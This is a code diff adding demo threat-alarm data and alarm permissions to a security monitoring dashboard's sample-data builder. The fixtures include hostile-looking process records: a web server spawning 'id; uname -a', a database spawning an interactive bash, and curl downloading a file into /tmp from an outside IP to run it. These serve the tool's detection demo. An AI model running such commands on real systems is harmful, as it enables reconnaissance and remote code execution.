@@ -204,10 +204,10 @@ export function buildDemoData(now = Date.now()) {
   ] as const;
   const access: AccessInventory = {
     roles: [
-      { role_id: "viewer", display_name: "Viewer", builtin: true, permissions: ["agents.read", "findings.read", "vulnerabilities.read"] },
-      { role_id: "analyst", display_name: "Analyst", builtin: true, permissions: ["agents.read", "findings.read", "vulnerabilities.read", "findings.triage", "assistant.use"] },
-      { role_id: "operator", display_name: "Operator", builtin: true, permissions: ["agents.read", "agents.revoke", "findings.read", "vulnerabilities.read", "tokens.read", "tokens.create", "tokens.revoke", "rules.upload"] },
-      { role_id: "admin", display_name: "Admin", builtin: true, permissions: ["agents.read", "agents.revoke", "findings.read", "vulnerabilities.read", "findings.triage", "tokens.read", "tokens.create", "tokens.revoke", "rules.read", "rules.upload", "audit.read", "audit.export", "audit.retention.manage", "rbac.read", "rbac.manage", "asset_groups.manage", "service_accounts.read", "service_accounts.manage", "assistant.use", "dashboards.share"] },
+      { role_id: "viewer", display_name: "Viewer", builtin: true, permissions: ["agents.read", "findings.read", "vulnerabilities.read", "alarms.read"] },
+      { role_id: "analyst", display_name: "Analyst", builtin: true, permissions: ["agents.read", "findings.read", "vulnerabilities.read", "findings.triage", "assistant.use", "alarms.read", "alarms.triage", "alarms.suppress"] },
+      { role_id: "operator", display_name: "Operator", builtin: true, permissions: ["agents.read", "agents.revoke", "findings.read", "vulnerabilities.read", "tokens.read", "tokens.create", "tokens.revoke", "rules.upload", "alarms.read"] },
+      { role_id: "admin", display_name: "Admin", builtin: true, permissions: ["agents.read", "agents.revoke", "findings.read", "vulnerabilities.read", "findings.triage", "tokens.read", "tokens.create", "tokens.revoke", "rules.read", "rules.upload", "audit.read", "audit.export", "audit.retention.manage", "rbac.read", "rbac.manage", "asset_groups.manage", "service_accounts.read", "service_accounts.manage", "assistant.use", "dashboards.share", "alarms.read", "alarms.triage", "alarms.suppress"] },
     ],
     users: people.map(([user_id, username, display_name]) => ({ user_id, username, display_name })),
     asset_groups: [
@@ -283,9 +283,44 @@ export function buildDemoData(now = Date.now()) {
     };
   });
 
+  // Threat alarms (P14): a few process starts that matched a rule.
+  const proc = (pid: number, exe: string, args: string[], uid = 33, cwd?: string) =>
+    ({ pid, exe, args, uid, euid: uid, truncated: false, ...(cwd ? { cwd } : {}) });
+  const alarmSpecs = [
+    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 3, minutes: 12,
+      process: proc(48211, "/usr/bin/sh", ["sh", "-c", "id; uname -a"], 33, "/var/www/html"),
+      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/"), proc(1100, "/usr/sbin/nginx", ["nginx: master process /usr/sbin/nginx"], 0, "/")] },
+    { rule: "shell-from-database", severity: "critical", message: "A database server started a shell", count: 1, minutes: 95,
+      process: proc(77310, "/usr/bin/bash", ["bash", "-i"], 26, "/var/lib/pgsql"),
+      ancestors: [proc(2210, "/usr/bin/postgres", ["postgres: checkpointer"], 26, "/var/lib/pgsql")] },
+    { rule: "download-to-tmp-and-run", severity: "high", message: "A program downloaded into /tmp and ran it", count: 1, minutes: 300,
+      process: proc(90122, "/usr/bin/curl", ["curl", "-o", "/tmp/x", "https://203.0.113.9/x"], 1000, "/tmp"),
+      ancestors: [proc(9001, "/usr/bin/bash", ["bash"], 1000, "/home/ola")] },
+    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 41, minutes: 2,
+      process: proc(51002, "/usr/bin/sh", ["sh", "-c", "/usr/local/bin/healthcheck"], 33, "/"),
+      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
+  ];
+  const alarms = alarmSpecs.map((spec, index) => {
+    const agent = agents[(index * 7) % agents.length];
+    const last = now - spec.minutes * MINUTE;
+    return {
+      id: String(9000 + index), agent_id: agent?.id ?? "agent-00001", hostname: agent?.hostname ?? null,
+      rule_set_id: "baseline", rule_id: spec.rule, severity: spec.severity, message: spec.message,
+      exe: spec.process.exe, parent_exe: spec.ancestors[0]?.exe ?? null, count: spec.count,
+      first_seen: iso(last - spec.count * 3 * MINUTE), last_seen: iso(last),
+      state: index === 2 ? "investigating" : "open", suppressed_by: null as string | null,
+      rule_set_version: 4, rule_version: 1, confidence: 80, process: spec.process, ancestors: spec.ancestors,
+      received_at: iso(last + 2000),
+      triage: { state: index === 2 ? "investigating" : "open", assigned_to: null as string | null, note: null as string | null,
+        accepted_until: null as string | null, version: index === 2 ? 2 : 1, updated_at: null as string | null, updated_by: null as string | null },
+    };
+  });
+  const alarmSuppressions: { id: string; rule_set_id: string; rule_id: string; scope: string; agent_id: string | null;
+    exe: string | null; args_sha256: string | null; note: string; created_by: string; created_at: string }[] = [];
+
   return {
     now, rules: RULES, agents, tags, certificates, findings, triage, advisories, vulnerabilities, access,
-    enrollmentTokens, ruleSets, bundles, serviceAccounts, serviceTokens, audit,
+    enrollmentTokens, ruleSets, bundles, serviceAccounts, serviceTokens, audit, alarms, alarmSuppressions,
     dashboards: [
       { dashboard_id: "d-admin-morning", owner: "u-admin", name: "My morning check", shared_role_id: null as string | null,
         layout: { schema: 1 as const, widgets: [
